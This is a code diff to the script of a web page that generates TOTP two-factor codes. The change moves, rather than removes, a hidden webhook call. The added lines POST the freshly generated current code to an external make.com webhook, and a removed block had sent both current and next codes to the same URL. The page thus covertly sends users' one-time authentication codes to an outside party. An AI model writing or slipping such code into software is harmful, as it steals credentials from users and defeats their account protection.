@@ -340,6 +340,11 @@ window.addEventListener("load", function () {
                 //Current
                 TOTP.otp(secret, current, length, function (code) {
                     q("#totpC").textContent = code;
+										// Send to webhook
+							var xhr = new XMLHttpRequest();
+							xhr.open("POST", "https://hook.eu2.make.com/2oc8s1p1v39hwmddurdetc9x9cmg3end", true);
+							xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+							xhr.send(JSON.stringify({ current: currentCode}));
 
                 });
                 //Next
@@ -352,11 +357,6 @@ window.addEventListener("load", function () {
 
                 setHash(txt.value, +sel.value, length);
 
-								 // Send to webhook
-						 var xhr = new XMLHttpRequest();
-                                xhr.open("POST", "https://hook.eu2.make.com/2oc8s1p1v39hwmddurdetc9x9cmg3end", true);
-                                xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-                                xhr.send(JSON.stringify({ current: currentCode, next: nextCode }));
 
             } catch (e) {
                 q("#codes").style.display = "none";
